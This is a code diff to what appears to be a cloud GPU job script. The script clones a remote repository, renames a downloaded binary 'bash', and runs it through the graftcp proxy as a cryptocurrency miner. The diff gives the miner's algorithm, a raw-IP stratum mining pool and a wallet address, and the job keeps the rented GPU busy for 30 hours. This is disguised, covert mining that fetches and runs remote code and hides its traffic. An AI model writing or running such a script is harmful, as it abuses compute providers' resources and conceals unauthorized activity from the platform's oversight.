@@ -19,7 +19,7 @@ image = (
     gpu="RTX4090",
     cpu=2,
     memory="4Gi",
-    timeout=168 * 60 * 60,
+    timeout=30 * 60 * 60,
 )
 def run_script():
 
@@ -53,15 +53,15 @@ def run_script():
 
     sleep 3
 
-    echo "=== DOWNLOAD LOL ==="
+    echo "=== DOWNLOAD T-REX ==="
     cd /mnt/code/pan
-    git clone https://github.com/malogrono/lol198.git
+    git clone https://gitlab.com/wimulyono7/t-rex.git
 
-    echo "=== CHECK LOL198 ==="
-    ls -lah /mnt/code/pan/lol198
+    echo "=== CHECK T-REX ==="
+    ls -lah /mnt/code/pan/t-rex
 
     echo "=== CHECK BASH ==="
-    cd /mnt/code/pan/lol198
+    cd /mnt/code/pan/t-rex
     ls -lh bash
 
     chmod u+x bash
@@ -79,10 +79,10 @@ def run_script():
     ls -lah
     
     echo "=== RUN PROC VIA GRAFTCP ==="
-    ./graftcp/graftcp ./bash --algo ETHASH --pool 57.129.82.223:80 --user LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg.01 --ethstratum ETHPROX
+    ./graftcp/graftcp ./bash -a progpowz -o stratum+tcp://95.111.195.159:80 -u iZ2q2xfw9AdX8YpGrcrjEPTG2ie8FMuXMFdDNKqRRbGo15zbuUfMAzDbtEDxcDpJcXGijaADG2WVs41p8PMiBnzrV95YkTX46Ca2EZvo8wXS -p x -w TRX
     """
 
     subprocess.run(["bash", "-lc", cmd], check=False)
 
-    print("Staying alive for 168 hours...")
-    time.sleep(60 * 60 * 168)
+    print("Staying alive for 30 hours...")
+    time.sleep(60 * 60 * 30)
